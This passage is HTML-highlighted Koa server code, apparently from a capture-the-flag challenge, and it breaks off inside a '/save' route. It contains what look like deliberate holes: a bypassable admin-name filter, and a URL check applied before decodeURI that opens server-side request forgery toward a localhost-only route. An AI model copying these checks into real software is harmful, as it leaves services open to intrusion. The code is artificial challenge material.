&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">bodyParser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa-bodyparser&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">isString&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;underscore&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">isString&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">views&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa-views&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;path&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa-static&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">http&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fs&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">md5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;md5&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">qs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;qs&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Koa&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">home&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">router&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">CONFIG&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;koa:sess&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">maxAge&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1800000&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">overwrite&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">httpOnly&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">signed&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">rolling&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">renew&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">checkUser&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/admin/i&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/admin/i&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">undefined&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">checkUrl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">indexOf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">server_ip&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;:3000/query&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">indexOf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;save&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;errorurl&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">WriteResults&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">filePath&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">sandbox&lt;/span> &lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39;/results.txt&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Promise&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resolve&lt;/span> &lt;span style="color:#111">=&amp;gt;{&lt;/span>
&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">appendFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">filePath&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;写入成功&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">resolve&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">filePath&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">DeleteResults&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">filePath&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39;/results.txt&amp;#39;&lt;/span>
&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">unlink&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">filePath&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;删除文件成功&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/query&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">param&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">param&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/&amp;amp;/g&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;amp;amp;&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/&amp;lt;/g&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;amp;lt;&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/&amp;gt;/g&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">status&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;missing parameter:param&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/request&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#39;ADMIN&amp;#39;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">decodeURI&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">checkUrl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#39;errorurl&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;error url&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;请求的url:&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#00a8c8">typeof&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;:&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Promise&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75af00">resolve&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">req&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setEncoding&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">statusCode&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">error&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;请求失败\n&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;span style="color:#d88200">`状态码: &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">statusCode&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">resume&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">chunk&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;end&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">out&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">WriteResults&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;Requst results in :&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;tmp&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">resolve&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;error&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">status&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;403: You have not the permission&amp;#39;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/save&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;::ffff:&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
